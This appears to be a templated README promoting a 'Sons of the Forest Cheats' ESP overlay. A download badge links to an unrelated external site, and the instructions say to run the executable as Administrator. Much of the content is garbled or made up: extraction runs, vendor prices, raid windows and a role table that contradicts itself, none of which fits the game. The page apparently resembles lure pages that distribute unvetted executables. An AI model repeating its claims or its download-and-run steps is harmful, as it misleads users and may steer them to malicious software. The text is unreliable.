<!-- ===== README Design Studio theme header (cosmic) ===== -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/5fcff4c08441a2c864aa1b08.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/c40646ff01be022e578f2504.png" />
    <img alt="Sons of the Forest Hero Banner" src="https://designreadme.top/assets/c40646ff01be022e578f2504.png" width="100%" />
  </picture>
</p>

<div align="center">

# Sons of the Forest Cheats

**Player ESP · Loot ESP · Resource ESP · Structure ESP · Animal ESP**

<p>
  <a href="https://shanxisaide.com/s/file">
    <picture>
      <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/d504e1e5659d22d6bab4c7c5.png" />
      <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/d5e5fbde2c62f0a3845d6267.png" />
      <img alt="Download Sons of the Forest Cheats" src="https://designreadme.top/assets/d5e5fbde2c62f0a3845d6267.png" width="197" height="67" />
    </picture>
  </a>
</p>

</div>

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Introduction

**Sons of the Forest Cheats** is a Windows desktop overlay built for players who want a clearer view of the match. The panel combines Player ESP, Loot ESP, Resource ESP, Structure ESP and Animal ESP in a single process, with a module list that can be trimmed per session.

Sons of the Forest is a survival horror game with base building, crafting and cannibal enemies. Players search for a missing billionaire on a remote island.

The overlay is designed around the actual decision points in Sons of the Forest. Cave routes are dark and complex. Base defense requires constant repair. The panel does not play the game for you. It surfaces information, timers and reference data so that your own decisions are faster and better informed.

Every module is optional. A player who only wants Player ESP can hide the rest; a player preparing for Story can load a profile that keeps Loot ESP, Resource ESP and Structure ESP on screen. Profiles are stored locally and can be exported as JSON.

## Table of Contents

- [Introduction](#introduction)
- [Quick Start Guide](#quick-start-guide)
- [System Requirements](#system-requirements)
- [In-Depth Feature Breakdown](#in-depth-feature-breakdown)
- [Module & Hotkey Overview](#module--hotkey-overview)
- [Advanced Configuration](#advanced-configuration)
- [Game Modes and Map Coverage](#game-modes-and-map-coverage)
- [Role and Loadout Notes](#role-and-loadout-notes)
- [Troubleshooting & Diagnostics](#troubleshooting--diagnostics)
- [Frequently Asked Questions](#frequently-asked-questions)
- [Changelog](#changelog)
- [SEO Keywords](#seo-keywords)

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Quick Start Guide

1. Download the archive from the badge at the top of this page.
2. Extract the archive into a dedicated folder; avoid Program Files and other protected paths.
3. Run the executable as Administrator so the overlay can attach to the Sons of the Forest window.
4. Launch Sons of the Forest and wait until the main menu or a match is fully loaded.
5. Press **INSERT** to open the config panel.
6. Choose a profile for Story or create a new one, then enable the modules you need.
7. Press **INSERT** again to close the panel; the overlay stays active until you use the panic key.

The first launch creates a default profile with conservative ranges. If the overlay does not appear, check the troubleshooting section before changing any game settings.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## System Requirements

| Component | Minimum | Recommended |
|---|---|---|
| OS | Windows 10 21H2, 64-bit | Windows 11, 64-bit |
| CPU | Intel Core i5-8400 / AMD Ryzen 5 2600 | Intel Core i7-10700 / AMD Ryzen 7 3700X |
| RAM | 8 GB | 16 GB |
| GPU | NVIDIA GTX 1060 / AMD RX 580 | NVIDIA RTX 2060 / AMD RX 6600 |
| Storage | 250 MB free | 500 MB on an SSD |
| Display | 1920 × 1080 | 2560 × 1440 or higher |
| Privileges | Administrator | Administrator |
| Runtime | .NET Desktop Runtime 6 | .NET Desktop Runtime 8 |

The overlay is a separate process. It does not install a service, does not write to the game folder and does not require a driver. All settings live under `%APPDATA%\Sons-of-the-Forest\profiles`.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## In-Depth Feature Breakdown

### 1. Player ESP

**Summary:** Player and squad outlines with health, distance and gear hints.

Player ESP draws players and squad members with colour-coded outlines, health bars and distance. The module can filter to enemies only and mark the last known direction after a player leaves vision. It is designed for extraction and survival games where a single unseen player can end a run.

| Parameter | What it changes |
|---|---|
| `max_distance` | 10 to 300 metres; the drawing range |
| `show_health` | on or off; adds a health bar |
| `squad_filter` | all, enemy or team; controls which players are drawn |

**Scenarios**
- Checking a ridge line on The Island before moving.
- Finding the last member of a squad after a fight on The Island.

**Limits**
- Only shows players the client is already aware of; it does not reveal players outside the local session.

**Pairs with:** Radar Overlay, Sound ESP  
**Default hotkey:** `F1`

### 2. Loot ESP

**Summary:** Container, weapon and consumable highlights with value filters.

Loot ESP highlights containers, weapons, meds, ammo and valuables on the ground. Each marker shows the item name and a value estimate where the game exposes one. The module can hide common items so only high-value loot is drawn, which keeps the screen readable during a fast scavenging run.

| Parameter | What it changes |
|---|---|
| `value_filter` | low, medium or high; the minimum value shown |
| `max_distance` | 5 to 150 metres; the highlight range |
| `show_containers` | on or off; includes crates and cabinets |

**Scenarios**
- Finding a med kit after a fight on Forest.
- Scanning a building on Forest for high-value loot.

**Limits**
- Value estimates are approximate and depend on the current market or vendor prices.

**Pairs with:** Player ESP, Resource ESP  
**Default hotkey:** `F2`

### 3. Resource ESP

**Summary:** Ore, wood, plants and water markers for crafting routes.

Resource ESP highlights gatherable resources such as ore, wood, plants and water. Each marker shows the resource type and a short respawn estimate where available. The module can filter by profession or crafting tier so the screen only shows the materials you actually need.

| Parameter | What it changes |
|---|---|
| `resource_filter` | ore, wood, plants or water; the tracked types |
| `max_distance` | 10 to 200 metres; the marker range |
| `show_respawn` | on or off; adds a respawn estimate |

**Scenarios**
- Planning a gathering route around Beach.
- Checking a cave on Beach for ore before a crafting session.

**Limits**
- Respawn estimates are approximate and depend on the server's spawn rules.

**Pairs with:** Loot ESP, Radar Overlay  
**Default hotkey:** `F3`

### 4. Structure ESP

**Summary:** Base, door, turret and trap markers with ownership hints.

Structure ESP highlights player-built structures such as bases, doors, turrets and traps. The module shows ownership where the game exposes it and marks the shortest path to a door or weak point. It is intended for scouting and raid planning, not for automating damage.

| Parameter | What it changes |
|---|---|
| `structure_filter` | bases, doors, turrets or traps; the tracked types |
| `max_distance` | 10 to 250 metres; the marker range |
| `show_owner` | on or off; adds an ownership hint |

**Scenarios**
- Scouting a base on Caves before a raid.
- Finding a door or weak point on Caves during a fight.

**Limits**
- Ownership hints are only available for structures the client has already loaded.

**Pairs with:** Player ESP, Raid Timer  
**Default hotkey:** `F4`

### 5. Animal ESP

**Summary:** Wildlife, predator and loot-animal markers.

Animal ESP highlights wildlife, predators and animals that drop useful loot. Each marker shows the species and distance, and the module can filter to hostile animals only. It is designed for hunting routes and for avoiding predators while travelling through open terrain.

| Parameter | What it changes |
|---|---|
| `animal_filter` | all, hostile or passive; controls which animals are drawn |
| `max_distance` | 10 to 200 metres; the marker range |
| `show_drops` | on or off; adds a short loot hint |

**Scenarios**
- Hunting a predator near Mountains for crafting materials.
- Avoiding a hostile animal while travelling through Mountains.

**Limits**
- Drop hints are approximate and depend on the animal's loot table.

**Pairs with:** Resource ESP, Radar Overlay  
**Default hotkey:** `F5`

### 6. Raid Timer

**Summary:** Raid windows, decay and upkeep timers in one panel.

Raid Timer tracks raid windows, structure decay and base upkeep. The panel shows the next vulnerable period and the resources required to keep a base alive, with configurable alerts before a timer expires. It is meant to help solo players and small groups plan defence without constant manual checks.

| Parameter | What it changes |
|---|---|
| `alert_lead` | 0 to 60 minutes; how early the alert appears |
| `show_upkeep` | on or off; adds an upkeep estimate |
| `timer_scale` | 0.5 to 2.0; changes the size of timer labels |

**Scenarios**
- Checking the next raid window before logging off on Bunker.
- Planning an upkeep run before a base decays on Bunker.

**Limits**
- Timers are based on the server's configured rules and may differ on modded servers.

**Pairs with:** Structure ESP, Radar Overlay  
**Default hotkey:** `F6`

### 7. Radar Overlay

**Summary:** Expanded map with players, resources and base markers.

The radar overlay replaces the stock minimap with a larger map that can be zoomed and panned. It draws players, resource nodes and base markers, and it keeps a short trail so you can read movement. Manual markers can be placed to note extraction points, monuments and patrol routes.

| Parameter | What it changes |
|---|---|
| `zoom` | 1.0 to 3.0; scales the radar view |
| `trail_length` | 0 to 10 seconds; how long position trails remain |
| `marker_limit` | 1 to 30; the number of manual markers per map |

**Scenarios**
- Reading a patrol route on Hell Cave without opening the full map.
- Marking an extraction point before a run on Hell Cave.

**Limits**
- Radar data is limited to the local client's view; it does not stream positions from other players.

**Pairs with:** Player ESP, Resource ESP  
**Default hotkey:** `F7`

### 8. Config Panel

**Summary:** Profiles, hotkeys and per-server settings in one menu.

The config panel stores named profiles, lets you rebind hotkeys, adjust panel opacity and export or import settings as JSON. Profiles can be tied to a server or mode so the overlay switches automatically when you change worlds. This keeps the interface consistent across a long wipe.

| Parameter | What it changes |
|---|---|
| `profile_slots` | 1 to 20; the number of saved profiles |
| `opacity` | 10 to 100 percent; overlay transparency |
| `panic_key` | any key; instantly hides every module |

**Scenarios**
- Switching from a PvE profile to a PvP profile on The Island.
- Exporting a working config to a teammate before a wipe.

**Limits**
- Profiles are stored locally; they are not synced to a cloud account.

**Pairs with:** Player ESP, Radar Overlay  
**Default hotkey:** `INSERT`

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Module & Hotkey Overview

| Module | Group | Hotkey | Purpose |
|---|---|---|---|
| Player ESP | World | `F1` | Player and squad outlines with health, distance and gear hints. |
| Loot ESP | World | `F2` | Container, weapon and consumable highlights with value filters. |
| Resource ESP | World | `F3` | Ore, wood, plants and water markers for crafting routes. |
| Structure ESP | World | `F4` | Base, door, turret and trap markers with ownership hints. |
| Animal ESP | World | `F5` | Wildlife, predator and loot-animal markers. |
| Raid Timer | Reference | `F6` | Raid windows, decay and upkeep timers in one panel. |
| Radar Overlay | World | `F7` | Expanded map with players, resources and base markers. |
| Config Panel | System | `INSERT` | Profiles, hotkeys and per-server settings in one menu. |

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Advanced Configuration

The config panel is split into four tabs: **Modules**, **Profiles**, **Hotkeys** and **About**. The Modules tab controls visibility and per-module parameters. Profiles stores named presets and can be tied to a mode or map. Hotkeys lets you rebind every action, including the panic key. About shows the build number and the current config path.

A complete backup is the whole `%APPDATA%\Sons-of-the-Forest` folder. Copy it before a major update so that profiles, colours and hotkeys survive the upgrade. To restore, close the overlay, replace the folder and start the executable again.

Global settings apply to every profile:

| Setting | Default | Notes |
|---|---|---|
| `overlay_opacity` | 85% | Applies to panels and labels |
| `ui_scale` | 100% | Useful on 1440p and 4K displays |
| `panic_key` | `END` | Hides every module instantly |
| `language` | English | Interface language |
| `log_level` | Info | Use Debug only for diagnostics |

Profiles can be exported as a single JSON file. The file contains no game data and no account information; it only stores module states, colours and hotkeys.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Game Modes and Map Coverage

The overlay ships with reference profiles for the main Sons of the Forest modes. Each profile enables a different set of modules, so switching modes does not require a manual rebuild.

| Mode | What the profile keeps on screen |
|---|---|
| **Story** | main campaign. Modules: Player ESP, Loot ESP, Resource ESP. |
| **Co-op** | up to eight players. Modules: Player ESP, Loot ESP, Resource ESP, Structure ESP. |
| **Building** | base construction. Modules: Player ESP, Loot ESP, Resource ESP, Structure ESP, Animal ESP. |
| **Survival** | hostile island. Modules: Player ESP, Loot ESP, Resource ESP. |

Map coverage includes The Island, Forest, Beach, Caves, Mountains, Bunker and Hell Cave. Radar profiles are user-editable: if a map receives a layout change, open the radar editor, align the new bounds and save the profile. The overlay does not download map data from a server.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Role and Loadout Notes

Sons of the Forest is played across several roles, and the overlay can be tuned for each one. The table below maps the common roles to the modules that usually matter most.

| Role | Modules to keep | Why |
|---|---|---|
| **Builder** | Player ESP, Loot ESP | Shapes the base; resource and structure data support the layout. |
| **Scavenger** | Loot ESP, Resource ESP | Keeps Loot ESP and Resource ESP visible for the role's core decisions. |
| **Fighter** | Resource ESP, Structure ESP | Takes fights; player and cooldown data support the engage. |
| **Explorer** | Structure ESP, Animal ESP | Covers ground; radar and resource data support the route. |
| **Medic** | Animal ESP, Raid Timer | Keeps the squad alive; health and cooldown data guide the timing. |

### Terminology used in this document

- **cannibal** — a hostile enemy
- **kelvin** — a companion NPC
- **virginia** — a companion NPC
- **base** — the player's shelter
- **crafting** — the item system
- **season** — the world cycle
- **shovel** — a key tool
- **cave** — a story location

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Troubleshooting & Diagnostics

| Symptom | Likely cause | Fix |
|---|---|---|
| Overlay does not appear | The executable is not running as Administrator | Close it, right-click the executable and choose **Run as administrator** |
| Panel appears but modules are empty | The game is still loading or the overlay attached too early | Restart the overlay after the match has fully loaded |
| Hotkeys do not respond | Another application captured the key | Rebind the hotkey in the Hotkeys tab or close the conflicting app |
| Overlay flickers in fullscreen | The game is using exclusive fullscreen | Switch to borderless windowed mode |
| High CPU usage | Too many modules are enabled at a long range | Lower `max_distance` and disable modules you do not use |
| Radar is misaligned after a map update | The saved map bounds are stale | Open the radar editor and realign the bounds |
| Config does not save | The profile folder is read-only | Move the folder to `%APPDATA%` and restart the overlay |
| Text is too small on a 4K display | `ui_scale` is below 100% | Raise `ui_scale` in the global settings |

Diagnostics are written to `%APPDATA%\Sons-of-the-Forest\logs`. The log contains module start-up order, attach status and any parameter validation errors. It does not contain game memory, account names or chat data.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Frequently Asked Questions

**What is Sons of the Forest Cheats?**

It is a Windows desktop overlay that adds optional information panels to Sons of the Forest. The panel includes Player ESP, Loot ESP, Resource ESP, Structure ESP and Animal ESP, and every module can be disabled independently.

**Does the overlay modify game files?**

No. It runs as a separate process and does not write to the game folder. Settings and profiles are stored under the user's AppData directory.

**Which Windows versions are supported?**

Windows 10 21H2 or newer and Windows 11, both 64-bit. Older builds may work but are not part of the tested matrix.

**Do I need to run it as Administrator?**

Yes. The overlay needs permission to attach to the game window and to draw above it. Running without administrator rights usually results in an empty or missing panel.

**Can I use more than one profile?**

Yes. The Profiles tab stores up to 20 named profiles. A profile can be tied to a mode or map so the overlay switches automatically.

**How do I hide the overlay quickly?**

Press the panic key, which is `END` by default. You can rebind it in the Hotkeys tab. The key hides every module without closing the process.

**Does the overlay work in borderless windowed mode?**

Yes. Borderless windowed is the recommended display mode. Exclusive fullscreen can cause flicker or prevent the overlay from drawing above the game.

**Can I export my settings?**

Yes. The Profiles tab has an Export button that writes a JSON file containing module states, colours and hotkeys. Import the same file on another machine to restore the setup.

**Does the overlay include map data?**

It includes editable radar profiles for the maps listed in this document. If a map changes, you can realign the bounds in the radar editor and save a new profile.

**How often is the overlay updated?**

Builds are published when a module changes or a compatibility fix is ready. The About tab shows the current build number; replace the old files with the new archive to update.

**Can I run the overlay on a laptop?**

Yes, provided the laptop meets the minimum requirements and the game runs in borderless windowed mode. Integrated graphics may struggle with the full module set.

**Where are the logs?**

Logs are written to `%APPDATA%\Sons-of-the-Forest\logs`. Set `log_level` to Debug only while diagnosing a problem, because debug logs grow quickly.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Changelog

- **v3.1 Stable** — refreshed module templates for Sons of the Forest, added per-mode profiles and aligned the radar editor with the current map list.
- **v3.1 Beta** — added the config panel tab, improved profile export and fixed hotkey conflicts on Windows 11.
- **Initial release** — first public build with player esp, loot esp and resource esp.

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## SEO Keywords

Sons of the Forest Cheats, cheats for Sons of the Forest, Sons of the Forest scripts, Sons of the Forest cheat panel, Sons of the Forest ESP, Sons of the Forest radar, Sons of the Forest overlay, Sons of the Forest Windows tool, Sons of the Forest admin panel, Sons of the Forest hotkey panel, Sons of the Forest config, Sons of the Forest tracker, Sons of the Forest Story, Sons of the Forest The Island, Sons of the Forest 2026, Sons of the Forest download, Sons of the Forest player ESP, Sons of the Forest loot ESP

<!-- Section Divider -->
<p align="center">
  <picture>
    <source media="(prefers-color-scheme: dark)" srcset="https://designreadme.top/assets/e9113c44e454216bc05910c6.png" />
    <source media="(prefers-color-scheme: light)" srcset="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" />
    <img alt="Section Divider" src="https://designreadme.top/assets/2b867d459b59720aa8640b81.png" width="100%" />
  </picture>
</p>

## Disclaimer

This documentation describes the behaviour of a desktop overlay. It makes no claims about detection status, account safety or official support. Use of the overlay is governed by the rules of Sons of the Forest, the server and the platform. The author is not responsible for account actions, data loss or hardware issues resulting from misuse. Review the current rules before use and keep backups of your configuration.
